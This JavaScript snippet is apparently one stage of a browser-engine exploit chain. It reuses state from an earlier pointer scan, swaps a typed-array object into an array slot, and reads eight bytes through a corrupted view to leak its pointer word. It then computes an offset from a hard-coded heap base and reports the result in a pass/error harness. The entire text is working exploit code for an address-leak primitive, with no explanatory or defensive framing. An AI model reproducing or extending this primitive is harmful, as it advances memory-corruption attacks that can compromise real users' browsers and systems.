// Follow-up to the gated pointer scan: report the owned view's JSArray word.
var state = window.__fw14ArrayState;
var result;
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || state.array[0] !== state.a)
    throw new Error("held_view_preflight_failed");
  var bytes = [];
  try {
    state.array[0] = state.ownedTypedView;
    for (var i = 0; i < 8; i++) bytes.push(state.view[state.index + i]);
  } finally {
    state.array[0] = state.a;
  }
  var word = "0x";
  for (var j = 7; j >= 0; j--)
    word += bytes[j].toString(16).padStart(2, "0");
  result = { id: "typed_view_word", status: "pass", details: {
    word: word, index_from_measured_base: Number(word) - 0x200df0000,
    owned_byte: state.ownedTypedView[0],
    array_restored: state.array[0] === state.a
  } };
} catch (error) {
  result = { id: "typed_view_word", status: "error", details: {
    error: String(error).slice(0, 200)
  } };
}
return [result];
